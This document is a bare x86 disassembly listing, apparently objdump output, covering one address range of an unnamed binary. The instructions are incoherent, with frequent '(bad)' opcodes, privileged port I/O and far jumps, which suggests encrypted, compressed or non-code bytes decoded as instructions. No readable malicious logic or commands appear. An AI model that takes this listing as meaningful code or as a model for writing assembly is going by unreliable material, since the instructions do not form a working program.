  405942:	mov    bh,0x99
  405944:	aam    0xd8
  405946:	pop    edi
  405947:	add    edi,DWORD PTR [edx-0x53]
  40594a:	outs   dx,BYTE PTR ds:[esi]
  40594b:	imul   edx,DWORD PTR [ecx+0x5f],0x36
  40594f:	loopne 0x4059bf
  405951:	out    0x1a,al
  405953:	pop    esi
  405954:	inc    ebx
  405955:	cld    
  405956:	lahf   
  405957:	and    al,0x28
  405959:	adc    BYTE PTR [esi],bh
  40595b:	fidivr WORD PTR ds:0x5b627886
  405961:	rol    BYTE PTR [ebx-0x5caaa37b],1
  405967:	into   
  405968:	in     eax,dx
  405969:	xchg   ecx,eax
  40596a:	lfs    edx,FWORD PTR [eax+0x4a]
  40596e:	dec    eax
  40596f:	xor    cl,BYTE PTR [edi]
  405971:	jb     0x40599b
  405973:	pop    es
  405974:	nop
  405975:	mov    esp,0x458f775f
  40597a:	call   0xd305:0x599c6b47
  405981:	dec    ecx
  405982:	mov    BYTE PTR [eax],dl
  405984:	and    eax,0x3f46088c
  405989:	and    ebx,DWORD PTR [ebp+0x8a08e8f]
  40598f:	imul   eax,DWORD PTR [ebx],0x31
  405992:	mov    dl,0xbe
  405994:	mov    eax,ds:0x5c6e2ce3
  405999:	push   ebx
  40599a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40599b:	jg     0x405983
  40599d:	jle    0x40594c
  40599f:	mov    al,0xca
  4059a1:	arpl   WORD PTR [eax],di
  4059a3:	add    eax,0x1a41c97a
  4059a8:	loopne 0x40593f
  4059aa:	adc    al,0xbf
  4059ac:	add    bh,dl
  4059ae:	call   ebx
  4059b0:	shr    BYTE PTR [ecx],cl
  4059b2:	js     0x405979
  4059b4:	push   ss
  4059b5:	ins    BYTE PTR es:[edi],dx
  4059b6:	out    0x73,al
  4059b8:	xlat   BYTE PTR ds:[ebx]
  4059b9:	mov    al,ds:0x1d7deda1
  4059be:	fbld   TBYTE PTR [eax-0x67]
  4059c1:	and    dl,BYTE PTR [eax+edi*2-0x72]
  4059c5:	mov    eax,ds:0x756ea291
  4059ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059cb:	lock adc ch,BYTE PTR [esi-0x1d]
  4059cf:	adc    al,0xeb
  4059d1:	dec    esp
  4059d2:	(bad)  
  4059d3:	retf   
  4059d4:	out    0xaa,al
  4059d6:	les    esp,FWORD PTR [esi+0x381c3d6c]
  4059dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059dd:	int    0x17
  4059df:	xor    ebp,DWORD PTR [edx-0x5761f6d0]
  4059e5:	int3   
  4059e6:	push   0xffffffc7
  4059e8:	dec    ecx
  4059e9:	sbb    al,0x54
  4059eb:	adc    eax,0xe4b3d281
  4059f0:	popa   
  4059f1:	jmp    0x405a6c
  4059f3:	cwde   
  4059f4:	mov    ecx,0x8ae78490
  4059f9:	and    ecx,edi
  4059fb:	(bad)  
  4059fc:	std    
  4059fd:	jge    0x405a74
  4059ff:	jl     0x405a70
  405a01:	and    BYTE PTR [edi+0x34ad0a90],ah
  405a07:	cmp    eax,0xb709dc5
  405a0c:	adc    DWORD PTR [eax-0x4cbabadb],edx
  405a12:	rep ins DWORD PTR es:[edi],dx
  405a14:	cmpxchg bh,bh
  405a17:	mov    WORD PTR [esi],?
  405a19:	push   es
  405a1a:	xor    al,0x34
  405a1c:	mov    ebp,0x6a051a35
  405a21:	mov    ebx,0x39c4b36c
  405a26:	jecxz  0x405a05
  405a28:	nop
  405a29:	ret    
  405a2a:	jmp    eax
  405a2c:	mov    eax,ds:0x7dc05c69
  405a31:	or     DWORD PTR [esi],ebx
  405a33:	inc    eax
  405a34:	jns    0x4059d2
  405a36:	adc    cl,cl
  405a38:	test   al,0xbc
  405a3a:	dec    edx
  405a3b:	js     0x405a55
  405a3d:	iret   
  405a3e:	(bad)  
  405a3f:	lods   al,BYTE PTR ds:[esi]
  405a40:	cmp    DWORD PTR [ecx+0x36e6d91a],ebp
  405a46:	mov    dl,0x4f
  405a48:	add    DWORD PTR [ecx],edi
  405a4a:	xor    BYTE PTR [eax+0x25],dh
  405a4d:	addr16 push esp
  405a4f:	test   eax,0x5737eb0f
  405a54:	cmp    al,0x32
  405a56:	(bad)  
  405a57:	ror    BYTE PTR [ecx+0x42],1
  405a5a:	ins    DWORD PTR es:[edi],dx
  405a5b:	rcl    DWORD PTR [esi+eax*2-0x7991e450],0xb1
  405a63:	fcmovbe st,st(5)
  405a65:	pop    eax
  405a66:	dec    ecx
  405a67:	xchg   ebp,eax
  405a68:	cmp    eax,0x84545481
  405a6d:	add    eax,0x56e9d5cd
  405a72:	xor    ecx,DWORD PTR [edx]
  405a74:	pop    ebp
  405a75:	dec    esp
  405a76:	pop    es
  405a77:	nop
  405a78:	xchg   ebp,eax
  405a79:	sub    BYTE PTR [esi+0x144437de],ch
  405a7f:	jg     0x405aa7
  405a81:	scas   eax,DWORD PTR es:[edi]
  405a82:	out    dx,eax
  405a83:	int3   
  405a84:	and    ch,BYTE PTR [esi+0x45]
  405a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a88:	inc    ebx
  405a89:	es (bad) 
  405a8b:	mov    ebp,DWORD PTR [eax+0x4033f8b2]
  405a91:	aam    0x8f
  405a93:	stos   BYTE PTR es:[edi],al
  405a94:	sahf   
  405a95:	es inc edi
  405a97:	out    dx,eax
  405a98:	inc    ebx
  405a99:	test   DWORD PTR [ebx-0x3e3008fa],eax
  405a9f:	inc    ecx
  405aa0:	data16 and BYTE PTR [eax+0x2b],ch
  405aa4:	or     DWORD PTR [esi-0x225ee33c],ecx
  405aaa:	xor    DWORD PTR [ebx+0x60],esp
  405aad:	jb     0x405a4f
  405aaf:	mov    BYTE PTR [ecx+0x13],bh
  405ab2:	in     eax,0x53
  405ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ab6:	imul   ebx,DWORD PTR [esp+esi*8],0xffffffb5
  405aba:	mul    BYTE PTR [ebp+ebx*8+0xae19b6c]
  405ac1:	xchg   ecx,eax
  405ac2:	stos   DWORD PTR es:[edi],eax
  405ac3:	xor    eax,0xab78c95d
  405ac8:	enter  0x7628,0x39
  405acc:	data16 jle 0x405afd
  405acf:	push   eax
  405ad0:	push   ecx
  405ad1:	push   edi
  405ad2:	iret   
  405ad3:	push   esi
  405ad4:	or     DWORD PTR [edx+0x21084725],esi
  405ada:	out    0xa6,al
  405adc:	sub    bh,BYTE PTR [eax+0x2f9ab3db]
  405ae2:	int    0x67
  405ae4:	ins    DWORD PTR es:[edi],dx
  405ae5:	popf   
  405ae6:	(bad)  
  405ae7:	mov    edx,0x59a35f3
  405aec:	in     al,0xe0
  405aee:	cmp    edi,DWORD PTR [eax-0x6847349b]
  405af4:	xchg   ebp,eax
  405af5:	pop    es
  405af6:	shl    esp,cl
  405af8:	cmp    ch,BYTE PTR [ebp+0x48]
  405afb:	xchg   DWORD PTR [ecx],eax
  405afd:	xor    edi,DWORD PTR [eax-0x11b97a06]
  405b03:	mov    cl,0xa2
  405b05:	and    al,0xa2
  405b07:	and    eax,0xaee08d88
  405b0c:	xchg   edx,eax
  405b0d:	mov    bh,0x7c
  405b0f:	dec    ebp
  405b10:	adc    ebp,esi
  405b12:	mov    ebx,0xd0b1aecb
  405b17:	ins    DWORD PTR es:[edi],dx
  405b18:	sar    BYTE PTR [eax+0x73],0x7
  405b1c:	pop    ecx
  405b1d:	dec    esi
  405b1e:	add    eax,0x86b7d7e4
  405b23:	push   cs
  405b24:	loope  0x405ade
  405b26:	rcr    eax,1
  405b28:	fs stc 
  405b2a:	add    edi,DWORD PTR [edx]
  405b2c:	pop    es
  405b2d:	cs xchg ebp,eax
  405b2f:	sub    al,0x8f
  405b31:	xor    ch,al
  405b33:	ds jg  0x405b7e
  405b36:	xchg   edi,eax
  405b37:	fcomp  QWORD PTR [eax]
  405b39:	sbb    esi,ebx
  405b3b:	cmc    
  405b3c:	mov    al,0xbb
  405b3e:	imul   ecx,DWORD PTR [eax+0x5cf48278],0x6758f059
  405b48:	xchg   edx,esp
  405b4a:	push   ebx
  405b4b:	xlat   BYTE PTR ss:[ebx]
  405b4d:	sbb    cl,dh
  405b4f:	or     al,0xca
  405b51:	jne    0x405ad7
  405b53:	push   eax
  405b54:	push   ebx
  405b55:	dec    ecx
  405b56:	retf   
  405b57:	adc    dl,ch
  405b59:	frstor [ecx-0x65]
  405b5c:	shl    ch,0x9e
  405b5f:	fwait
  405b60:	mov    ds:0xe1cc3dcd,al
  405b65:	xchg   edx,eax
  405b66:	jge    0x405b62
  405b68:	mul    dl
  405b6a:	lods   al,BYTE PTR ds:[esi]
  405b6b:	push   0x11
  405b6d:	sub    al,0x44
  405b6f:	sub    DWORD PTR [eax-0x6ee74886],edx
  405b75:	sar    dl,cl
  405b77:	pop    esp
  405b78:	cwde   
  405b79:	dec    ebp
  405b7a:	cmp    BYTE PTR [ecx-0x35],cl
  405b7d:	sbb    dh,bl
  405b7f:	out    0x3b,eax
  405b81:	inc    esp
  405b82:	xor    al,0xf7
  405b84:	jg     0x405bb7
  405b86:	retf   
  405b87:	lahf   
  405b88:	cmp    DWORD PTR [edx],ebx
  405b8a:	ficomp WORD PTR [ebx+0x1a]
  405b8d:	jmp    0x885d:0x351c6ead
  405b94:	add    al,0x40
  405b96:	(bad)  
  405b97:	jb     0x405bae
  405b99:	aad    0x6c
  405b9b:	cmp    DWORD PTR [ecx+0x5a4dc9c5],ecx
  405ba1:	xchg   esi,eax
  405ba2:	lock outs dx,DWORD PTR ds:[esi]
  405ba4:	mov    bl,0xdf
  405ba6:	pop    ds
  405ba7:	shl    BYTE PTR [edx+0x58],0xa4
  405bab:	gs aas 
  405bad:	fild   WORD PTR [bp+di+0x5a]
  405bb1:	sub    BYTE PTR [ecx+0x521c85b5],bh
  405bb7:	mov    ebx,0x103fcb33
  405bbc:	push   edi
  405bbd:	pop    ebx
  405bbe:	or     al,0x79
  405bc0:	sub    esp,DWORD PTR [ebp+edi*4+0x51]
  405bc4:	je     0x405c19
  405bc6:	inc    ebx
  405bc7:	mov    al,0xe2
  405bc9:	test   al,0x40
  405bcb:	adc    esp,DWORD PTR [eax-0x7fcac69b]
  405bd1:	xor    eax,0x9767a3a9
  405bd6:	les    ebx,FWORD PTR [esi+0x3baa7ac5]
  405bdc:	xor    cl,BYTE PTR [esi+0x3c46f026]
  405be2:	and    al,0xb7
  405be4:	mov    eax,0xb0d90aab
  405be9:	cld    
  405bea:	mov    cl,0x8f
  405bec:	loope  0x405c00
  405bee:	cwde   
  405bef:	ficom  DWORD PTR [edi+edi*8-0x4e]
  405bf3:	in     eax,dx
  405bf4:	mov    edi,0x9045642c
  405bf9:	das    
  405bfa:	fadd   QWORD PTR [esi]
  405bfc:	mov    ebp,0x8ab8a64a
  405c01:	xlat   BYTE PTR ds:[ebx]
  405c02:	push   ecx
  405c03:	jmp    0x405c37
  405c05:	dec    edi
  405c06:	jne    0x405c2c
  405c08:	inc    esp
  405c09:	push   cs
  405c0a:	cld    
  405c0b:	mov    dh,bl
  405c0d:	clc    
  405c0e:	dec    eax
  405c0f:	or     dl,BYTE PTR [edi]
  405c11:	sub    al,0x72
  405c13:	div    BYTE PTR [ebx+0x28b1f5b2]
  405c19:	dec    edi
  405c1a:	sbb    al,bh
  405c1c:	mov    BYTE PTR [ebp-0x50],cl
  405c1f:	inc    eax
  405c20:	shl    BYTE PTR [edi],0xd6
  405c23:	inc    ebx
  405c24:	adc    ebx,ebx
  405c26:	sub    al,0xf5
  405c28:	rol    ch,1
  405c2a:	shl    DWORD PTR [edx],0x29
  405c2d:	xchg   esp,eax
  405c2e:	fwait
  405c2f:	pusha  
  405c30:	ins    BYTE PTR es:[edi],dx
  405c31:	adc    eax,DWORD PTR [esi]
  405c33:	outs   dx,BYTE PTR ds:[esi]
  405c34:	mov    bh,0x44
  405c36:	in     eax,0x99
  405c38:	cs push ds
  405c3a:	xor    DWORD PTR [si+0x56],edx
  405c3e:	sar    BYTE PTR [edi],1
  405c40:	imul   BYTE PTR [ebp+eiz*1-0x4e11493e]
  405c47:	mov    bl,0x24
  405c49:	cmc    
  405c4a:	jmp    0xb210:0xef542073
  405c51:	jbe    0x405c69
  405c53:	mov    esp,0x6537cc95
  405c58:	sub    ch,ch
  405c5a:	cmp    eax,0x6da333ac
  405c5f:	rcr    BYTE PTR [ecx+0x769a005a],0x7b
  405c66:	push   ebx
  405c67:	and    DWORD PTR [esi],edx
  405c69:	out    0x18,al
  405c6b:	jno    0x405c57
  405c6d:	xchg   DWORD PTR es:[ecx+0x376965bc],ebp
  405c74:	add    eax,0x749e9217
  405c79:	add    al,0xba
  405c7b:	ja     0x405c09
  405c7d:	xor    BYTE PTR [edi+0x7deb14fe],dl
  405c83:	jo     0x405c0c
  405c85:	(bad)  
  405c86:	mov    eax,0x730ec717
  405c8b:	cmp    ah,cl
  405c8d:	lahf   
  405c8e:	in     al,dx
  405c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c90:	ins    BYTE PTR es:[edi],dx
  405c91:	sbb    al,0x29
  405c93:	add    dl,BYTE PTR [ecx+ecx*2+0x1a]
  405c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c98:	jno    0x405caa
  405c9a:	jle    0x405c9f
  405c9c:	cs pop ds
  405c9e:	dec    edi
  405c9f:	clc    
  405ca0:	inc    ebx
  405ca1:	push   edx
  405ca2:	mov    ah,0x41
  405ca4:	lea    esp,[ebx-0x38]
  405ca7:	mov    bh,0xe6
  405ca9:	xchg   edi,eax
  405caa:	iret   
  405cab:	mov    al,BYTE PTR [edi]
  405cad:	mov    ecx,0xa1bc0c01
  405cb2:	xchg   ecx,eax
  405cb3:	push   ss
  405cb4:	repz scas eax,DWORD PTR es:[edi]
  405cb6:	scas   al,BYTE PTR es:[edi]
  405cb7:	mov    bl,0xf1
  405cb9:	pop    ss
  405cba:	cmp    DWORD PTR [eax],esi
  405cbc:	leave  
  405cbd:	jae    0x405ca1
  405cbf:	stos   DWORD PTR es:[edi],eax
  405cc0:	fild   DWORD PTR [edx-0x4]
  405cc3:	cli    
  405cc4:	in     eax,0xef
  405cc6:	popa   
  405cc7:	ja     0x405c4f
  405cc9:	xchg   esp,eax
  405cca:	call   0x87b51395
  405ccf:	stos   BYTE PTR es:[edi],al
  405cd0:	cmp    DWORD PTR [edi-0x7e],ebp
  405cd3:	xchg   esi,eax
  405cd4:	icebp  
  405cd5:	imul   ebx,eax,0x72b7be09
  405cdb:	call   0xf9a2974b
  405ce0:	fs lea ecx,ss:[eax+0x21503fbf]
  405ce8:	and    DWORD PTR [ebx-0x10],eax
  405ceb:	jecxz  0x405d03
  405ced:	inc    eax
  405cee:	add    BYTE PTR [esi],bh
  405cf0:	js     0x405c80
  405cf2:	sahf   
  405cf3:	test   eax,0x97166bd7
  405cf8:	push   eax
  405cf9:	ret    0xd802
  405cfc:	inc    ebx
  405cfd:	mov    esi,0x7049068e
  405d02:	xchg   DWORD PTR [edi-0x46b9e66b],ebx
  405d08:	cs dec ecx
  405d0a:	shl    DWORD PTR [ebp+0x7cc4cf22],cl
  405d10:	test   al,cl
  405d12:	jle    0x405d83
  405d14:	push   edx
  405d15:	adc    al,0x15
  405d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d18:	out    dx,al
  405d19:	idiv   ch
  405d1b:	dec    edx
  405d1c:	scas   al,BYTE PTR es:[edi]
  405d1d:	(bad)
  405d20:	mov    dh,0xab
  405d22:	fild   DWORD PTR [edx]
  405d24:	mov    dh,0x82
  405d26:	inc    esi
  405d27:	ret    0x4368
  405d2a:	retf   0x501e
  405d2d:	call   0x215447c
  405d32:	inc    eax
  405d33:	imul   ebp,esi,0x3
  405d36:	and    ecx,edx
  405d38:	sub    BYTE PTR [edx],dl
  405d3a:	push   esp
  405d3b:	ret    
  405d3c:	les    ecx,FWORD PTR [ecx+eax*4-0x47]
  405d40:	and    DWORD PTR [esi+0x49],esi
  405d43:	add    eax,0x3cac6487
  405d48:	push   ecx
  405d49:	imul   edx,esi,0xc3e11e4a
  405d4f:	jmp    DWORD PTR [edx-0x21]
  405d52:	sbb    edi,DWORD PTR [edx+0x43daf706]
  405d58:	mov    edx,0x33aad6c2
  405d5d:	pop    ds
  405d5e:	ret    
  405d5f:	dec    ecx
  405d60:	in     eax,0x4a
  405d62:	sbb    esi,edi
  405d64:	dec    eax
  405d65:	enter  0x33b7,0x75
  405d69:	fnstenv [ecx+0x4d613b5e]
  405d6f:	mov    esp,0x7ec5387f
  405d74:	fwait
  405d75:	sub    dl,dl
  405d77:	fild   WORD PTR [esi+eax*1-0x1295fa24]
  405d7e:	jbe    0x405d0c
  405d80:	iret   
  405d81:	iret   
  405d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d83:	mov    edi,0x9d8ba0e8
  405d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d89:	xor    eax,0xadfe5c29
  405d8e:	std    
  405d8f:	or     eax,0xf8d8c0ca
  405d95:	neg    DWORD PTR [esi+0x6948ee11]
  405d9b:	fwait
  405d9c:	ja     0x405df6
  405d9e:	test   eax,0x6ce652ce
  405da3:	fs or  bl,0x42
  405da7:	jb     0x405da5
  405da9:	or     al,0x48
  405dab:	stc    
  405dac:	imul   edx,DWORD PTR [ebx-0x2a],0xf91d7a2b
  405db3:	jno    0x405d59
  405db5:	add    BYTE PTR ds:0x1cd44de4,ah
  405dbb:	pushf  
  405dbc:	(bad)  
  405dbd:	int3   
  405dbe:	(bad)  
  405dbf:	pop    ebp
  405dc0:	sub    DWORD PTR [ebp-0x74],edx
  405dc3:	push   esi
  405dc4:	lock sar DWORD PTR [ebx],cl
  405dc7:	outs   dx,DWORD PTR ds:[esi]
  405dc8:	mov    edi,0x513c7863
  405dcd:	iret   
  405dce:	push   edi
  405dcf:	mov    BYTE PTR [edi],dl
  405dd1:	pop    esp
  405dd2:	sub    edx,eax
  405dd4:	sub    eax,0xc5cdd8c3
  405dd9:	dec    edx
  405dda:	mov    edx,0x6318e8bc
  405ddf:	into   
  405de0:	ror    DWORD PTR [eax+0x27],cl
  405de3:	add    ebp,DWORD PTR [eax-0x14]
  405de6:	test   eax,0x5fb00c39
  405deb:	push   ss
  405dec:	(bad)  
  405ded:	mov    ax,ds:0xe55e1bbd
  405df3:	sub    esp,DWORD PTR [edi-0x40]
  405df6:	shl    DWORD PTR [esi+0x4fab03ed],1
  405dfc:	jmp    0xba412e66
  405e01:	repnz mov DWORD PTR [eax],0xff2d086d
  405e08:	mov    ah,0x52
  405e0a:	push   ebp
  405e0b:	xchg   ecx,eax
  405e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0d:	cdq    
  405e0e:	stc    
  405e0f:	mov    dh,BYTE PTR [ecx+ebp*8+0x70]
  405e13:	or     ch,BYTE PTR [ecx+0x78a36177]
  405e19:	(bad)  
  405e1a:	(bad)  
  405e1b:	lods   eax,DWORD PTR ds:[esi]
  405e1c:	jne    0x405e06
  405e1e:	mov    dh,0x4
  405e20:	mov    bl,0x4d
  405e22:	adc    ebp,edx
  405e24:	mov    ds:0xaeca04b1,al
  405e29:	dec    edx
  405e2a:	mov    WORD PTR ds:0x42a5f4dc,?
  405e30:	push   0xcd8bf4be
  405e35:	or     DWORD PTR [esi],edi
  405e37:	iret   
  405e38:	shl    ebx,cl
  405e3a:	lods   al,BYTE PTR ds:[esi]
  405e3b:	push   ebx
  405e3c:	stos   DWORD PTR es:[edi],eax
  405e3d:	push   ebx
  405e3e:	sbb    BYTE PTR [ebx+0x53b63e78],dh
  405e44:	stc    
  405e45:	(bad)  
  405e46:	xor    eax,0xf81097f9
  405e4b:	nop
  405e4c:	ja     0x405e8b
  405e4e:	pop    ebx
  405e4f:	pop    esp
  405e50:	into   
  405e51:	in     al,0xc8
  405e53:	aad    0xf9
  405e55:	push   edi
  405e56:	std    
  405e57:	cmp    eax,0xe59f3923
  405e5c:	mov    edi,0xc77ecc5c
  405e61:	mov    WORD PTR [eax],ss
  405e63:	sub    al,0x39
  405e65:	and    al,ch
  405e67:	add    cl,dl
  405e69:	outs   dx,BYTE PTR ds:[esi]
  405e6a:	push   eax
  405e6b:	cdq    
  405e6c:	retf   
  405e6d:	(bad)  
  405e6f:	loop   0x405e04
  405e71:	or     edi,ecx
  405e73:	(bad)
  405e77:	push   es
  405e78:	push   0x4d90c98b
  405e7d:	dec    eax
  405e7e:	pop    edi
  405e7f:	loope  0x405e36
  405e81:	xor    eax,0x6288aa7e
  405e86:	jae    0x405e9b
  405e88:	xchg   ebp,eax
  405e89:	mov    ds:0xce42cc2,al
  405e8e:	xlat   BYTE PTR ds:[ebx]
  405e8f:	mov    dl,0x75
  405e91:	clc    
  405e92:	ret    
  405e93:	ds jg  0x405e6b
  405e96:	mov    esp,0xa0fb991
  405e9b:	mov    bh,0xb1
  405e9d:	pusha  
  405e9e:	or     edi,DWORD PTR [esi+ebx*4-0x52]
  405ea2:	cdq    
  405ea3:	rcl    BYTE PTR [edi+edi*4-0x26f54e90],cl
  405eaa:	inc    ebp
  405eab:	shr    BYTE PTR [edx+0x51],1
  405eae:	out    0x19,al
  405eb0:	mov    ecx,ebx
  405eb2:	inc    edi
  405eb3:	retf   
  405eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eb5:	pop    ss
  405eb6:	ds push eax
  405eb8:	push   ss
  405eb9:	mov    bh,BYTE PTR [eax+0x0]
  405ebc:	jg     0x405f18
  405ebe:	xor    bh,dh
  405ec0:	mov    cl,0x27
  405ec2:	fadd   st(7),st
  405ec4:	and    al,0xee
  405ec6:	adc    esi,DWORD PTR [esp+esi*4-0x3]
  405eca:	dec    edi
  405ecb:	mov    al,0xac
  405ecd:	loop   0x405ef7
  405ecf:	aam    0x31
  405ed1:	adc    eax,0x3281b7bc
  405ed6:	sahf   
  405ed7:	mov    bl,0xe4
  405ed9:	dec    edx
  405eda:	ja     0x405ecb
  405edc:	jp     0x405e87
  405ede:	shl    bl,0x6e
  405ee1:	jp     0x405f2c
  405ee3:	arpl   bx,sp
  405ee5:	das    
  405ee6:	dec    esp
  405ee7:	dec    ebx
  405ee8:	idiv   DWORD PTR [ebp-0x1e]
  405eeb:	sub    BYTE PTR [edx],cl
  405eed:	in     eax,dx
  405eee:	sbb    ecx,0xffffffec
  405ef1:	cmp    eax,0xf1b36d00
  405ef6:	mov    ebp,0xebd2de13
  405efb:	ret    
  405efc:	shl    eax,0xc4
  405eff:	pusha  
  405f00:	outs   dx,BYTE PTR ds:[esi]
  405f01:	imul   ecx,DWORD PTR [ebp+0x4],0xffffffc6
  405f05:	cs jbe 0x405ee9
  405f08:	mov    dl,0xf1
  405f0a:	cmp    dh,BYTE PTR [ebx+0x3d2ef8e5]
  405f10:	add    eax,0xc056a3d3
  405f15:	fld    TBYTE PTR [ecx+0x1e7353d6]
  405f1b:	fdivr  QWORD PTR [edi-0x5a]
  405f1e:	mov    ah,0xb
  405f20:	sbb    al,0x23
  405f22:	lds    ecx,FWORD PTR [eax+edx*2-0x55]
  405f26:	jbe    0x405ebc
  405f28:	xor    eax,0xb51201b0
  405f2d:	xor    cl,BYTE PTR [ebx+0x107d97d0]
  405f33:	xchg   esi,eax
  405f34:	out    0x8c,eax
  405f36:	fnstenv [ebp-0x919e28b]
  405f3c:	shl    DWORD PTR [esi],1
  405f3e:	imul   edx,ebx,0xfffffff9
  405f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f42:	push   ebp
  405f43:	xchg   esi,ebp
  405f45:	inc    edi
  405f46:	pushf  
  405f47:	mov    ebx,0x88425ead
  405f4c:	nop
  405f4d:	jge    0x405ed0
  405f4f:	xchg   ebp,eax
  405f50:	xchg   ecx,eax
  405f51:	dec    ebx
  405f52:	push   ds
  405f53:	cmp    al,0x7a
  405f55:	stos   DWORD PTR es:[edi],eax
  405f56:	jmp    0xab949891
  405f5b:	(bad)  [edx+ecx*1+0x54]
  405f5f:	cmp    edi,DWORD PTR [esi+0x20]
  405f62:	inc    ecx
  405f63:	mov    bl,0xb
  405f65:	rcr    edi,cl
  405f67:	(bad)  
  405f68:	out    dx,eax
  405f69:	(bad)  
  405f6a:	cli    
  405f6b:	push   ebx
  405f6c:	xchg   ecx,eax
  405f6d:	mov    bh,0xb3
  405f6f:	cwde   
  405f70:	sti    
  405f71:	and    BYTE PTR [ebp-0x46d2d6c6],0xa9
  405f78:	fwait
  405f79:	pop    edi
  405f7a:	data16 or BYTE PTR [ecx-0x32],bl
  405f7e:	es test BYTE PTR gs:[edx+edx*8+0x1f],al
  405f84:	test   eax,0x1f32f51f
  405f89:	cdq    
  405f8a:	mov    DWORD PTR [edx+0xc],ebx
  405f8d:	mov    ch,0x6e
  405f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f90:	push   ebp
  405f91:	push   0xffffffa6
  405f93:	push   es
  405f94:	jl     0x405f68
  405f96:	add    BYTE PTR [ebp+0x30],bl
  405f99:	mov    esi,0x454ee11e
  405f9e:	aam    0xa5
  405fa0:	jge    0x405f60
  405fa2:	(bad)  
  405fa3:	stc    
  405fa4:	xchg   esp,eax
  405fa5:	out    dx,eax
  405fa6:	add    al,0x6e
  405fa8:	scas   al,BYTE PTR es:[edi]
  405fa9:	and    eax,0x7575080e
  405fae:	loop   0x405fc9
  405fb0:	inc    ebx
  405fb1:	push   edx
  405fb2:	push   esi
  405fb3:	(bad)  
  405fb4:	fmul   QWORD PTR [esi+ecx*8-0x52]
  405fb8:	test   DWORD PTR [edi+0x1551e47f],0x1132c5a9
  405fc2:	outs   dx,BYTE PTR ds:[esi]
  405fc3:	lock frstor [ecx]
  405fc6:	fisttp WORD PTR [edi]
  405fc8:	pop    edi
  405fc9:	jmp    0x1dea:0x50aa1241
  405fd0:	adc    cl,dh
  405fd2:	test   al,0xe3
  405fd4:	pop    ebp
  405fd5:	je     0x405fb5
  405fd7:	cmp    edi,DWORD PTR [ecx-0x3a]
  405fda:	(bad)  
  405fdb:	sub    dl,BYTE PTR [edx]
  405fdd:	xor    al,0xc5
  405fdf:	sbb    ecx,ebp
  405fe1:	dec    esi
  405fe2:	std    
  405fe3:	mov    ss,WORD PTR [edx]
  405fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fe6:	inc    esi
  405fe7:	lock jae 0x406010
  405fea:	idiv   BYTE PTR [ebx-0x32]
  405fed:	sub    eax,0x20e4dc6
  405ff2:	cmp    BYTE PTR [ebx+0x4b],ch
  405ff5:	sbb    esp,DWORD PTR [ecx]
  405ff7:	cmp    esi,esp
  405ff9:	push   cs
  405ffa:	inc    eax
  405ffb:	mov    ecx,0x6e02f0be
  406000:	adc    al,bl
  406002:	aam    0xf4
  406004:	fwait
  406005:	pushf  
  406006:	mov    bl,cl
  406008:	std    
  406009:	add    DWORD PTR [eax+esi*2+0x6e],esi
  40600d:	in     eax,dx
  40600e:	xchg   esp,eax
  40600f:	and    ax,0xaeff
  406013:	inc    eax
  406014:	adc    al,bh
  406016:	ret    
  406017:	sub    BYTE PTR [ebp-0x5f0c16fb],cl
  40601d:	test   BYTE PTR [esi-0x73],ah
  406020:	jmp    0x406089
  406022:	fwait
  406023:	sbb    ch,BYTE PTR [ecx-0x34]
  406026:	out    0xff,eax
  406028:	ret    0xc7ac
  40602b:	cmp    eax,0x3013599f
  406030:	push   esp
  406031:	xchg   DWORD PTR [ecx],ebp
  406033:	and    al,0xe6
  406035:	popf   
  406036:	cmc    
  406037:	sub    DWORD PTR [ecx+0x4f],esp
  40603a:	(bad)  
  40603b:	inc    edi
  40603c:	xor    al,0x6f
  40603e:	call   0x4f53:0x5ca47dc4
  406045:	pop    ebp
  406046:	mov    ebx,DWORD PTR [esi+edi*2-0x4e3d7297]
  40604d:	inc    eax
  40604e:	push   ebp
  40604f:	hlt    
  406050:	or     eax,0x5103ef40
  406055:	test   DWORD PTR [eax],ebp
  406057:	mov    bh,0x1c
  406059:	les    eax,FWORD PTR [ebx]
  40605b:	and    BYTE PTR [ebx-0x2d5a546a],ah
  406061:	stos   DWORD PTR es:[edi],eax
  406062:	test   al,0x45
  406064:	loop   0x40607f
  406066:	test   DWORD PTR [ebx+0x70cff48d],ebx
  40606c:	mov    fs,WORD PTR [ecx+edi*4+0xb19f2ee]
  406073:	cmp    BYTE PTR [ebx-0x7e91d946],al
  406079:	sahf   
  40607a:	bound  ecx,QWORD PTR [edx+0x19]
  40607d:	push   0xb2c13c36
  406082:	jnp    0x4060ef
  406084:	out    0xf7,al
  406086:	test   eax,0xe87c9c6c
  40608b:	jg     0x4060de
  40608d:	(bad)  
  40608e:	enter  0xc66a,0x44
  406092:	sub    ah,ch
  406094:	shl    BYTE PTR [eax],1
  406096:	mov    ds:0x817fd51e,al
  40609b:	sahf   
  40609c:	push   edx
  40609d:	push   ebp
  40609e:	sub    ecx,0x304b6439
  4060a4:	sahf   
  4060a5:	mov    gs,ebx
  4060a7:	or     dh,ch
  4060a9:	repz sub edi,DWORD PTR [edx+0x1e45d5f4]
  4060b0:	add    edi,edi
  4060b2:	jle    0x406050
  4060b4:	icebp  
  4060b5:	dec    ebp
  4060b6:	mov    eax,0x4efdb414
  4060bb:	jmp    DWORD PTR [edx-0x55]
  4060be:	pop    DWORD PTR [esi]
  4060c0:	cmp    BYTE PTR [ebx-0x394f869c],dl
  4060c6:	ins    DWORD PTR es:[edi],dx
  4060c7:	xchg   edx,eax
  4060c8:	enter  0x5eb4,0xc3
  4060cc:	mov    ah,BYTE PTR gs:[eax]
